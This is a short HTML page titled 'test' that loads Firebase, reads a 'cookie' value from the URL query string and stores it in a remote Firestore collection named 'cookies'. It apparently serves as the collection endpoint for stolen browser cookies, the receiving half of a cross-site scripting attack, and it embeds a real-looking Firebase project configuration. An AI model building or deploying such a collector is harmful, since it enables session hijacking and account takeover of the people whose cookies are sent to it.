<!DOCTYPE html>
<html>
<head>
  <title>test</title>
  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-firestore-compat.js"></script>
</head>
<body>
  <div id="result"></div>
  <script>
    // Firebaseの設定
    const firebaseConfig = {
      apiKey: "AIzaSyDrq94GLA2rl7uP-ZuGfpZGjsLY9be_2pY",
      authDomain: "lets-go-to-school-login.firebaseapp.com",
      databaseURL: "https://lets-go-to-school-login-default-rtdb.firebaseio.com",
      projectId: "lets-go-to-school-login",
      storageBucket: "lets-go-to-school-login.appspot.com",
      messagingSenderId: "781949835802",
      appId: "1:781949835802:web:57b3a3e2de9bdd05bf8fa3",
      measurementId: "G-3LLR2R3Z2C"
    };

    // Firebaseの初期化
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // URLからクエリパラメータを取得
    const urlParams = new URLSearchParams(window.location.search);
    const cookie = urlParams.get('cookie');

    // Firestoreにデータを送信
    if (cookie) {
      db.collection("cookies").add({
        cookie: cookie, // パラメータ名をcookieに変更
      })
      .then((docRef) => {
        document.getElementById("result").innerHTML = "Document written with ID: " + docRef.id;
      })
      .catch((error) => {
        document.getElementById("result").innerHTML = "Error adding document: " + error;
      });
    } else {
      document.getElementById("result").innerHTML = "Cookie parameter is missing.";
    }
  </script>
</body>
</html>
